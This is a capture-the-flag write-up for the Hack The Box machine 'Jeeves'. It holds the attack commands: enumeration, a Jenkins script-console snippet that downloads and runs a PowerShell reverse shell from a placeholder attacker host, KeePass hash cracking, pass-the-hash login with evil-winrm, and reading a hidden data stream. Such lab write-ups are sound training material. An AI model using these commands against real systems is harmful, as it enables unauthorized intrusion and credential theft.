---
title: "HTB: Jeeves"
description: "A medium Windows box with Jenkins RCE, a KeePass database, pass-the-hash, and a hidden NTFS alternate data stream."
date: 2026-06-08
platform: "Hack The Box"
difficulty: "Medium"
os: "Windows"
thumbnail: "/assets/images/writeup-jeeves.svg"
reading_time: "6 min read"
tags: ["jenkins", "keepass", "windows", "pass-the-hash"]
---

## Enumeration

Port 80 looked intentionally fake, so I checked for virtual hosts and uncommon ports. Jenkins was exposed on a high port without authentication.

```bash
nmap -sCV -p- --min-rate 4000 10.10.10.20
ffuf -u http://10.10.10.20:50000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

## Initial Access

Jenkins script console allowed command execution. A PowerShell reverse shell was enough to get a stable user shell.

```groovy
def cmd = "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"
"cmd.exe /c ${cmd}".execute()
```

## Privilege Escalation

The user profile contained a KeePass database. After recovering the password, the database exposed an NTLM hash for Administrator.

```bash
keepass2john CEH.kdbx > keepass.hash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
evil-winrm -i 10.10.10.20 -u Administrator -H REDACTED
```

## Flag Surprise

The root flag was hidden in an NTFS alternate data stream.

```powershell
dir /r
more < hm.txt:root.txt
```

## Takeaway

When a service looks too clean, look around it. The actual attack path may be on a forgotten admin interface, not the polished web page.
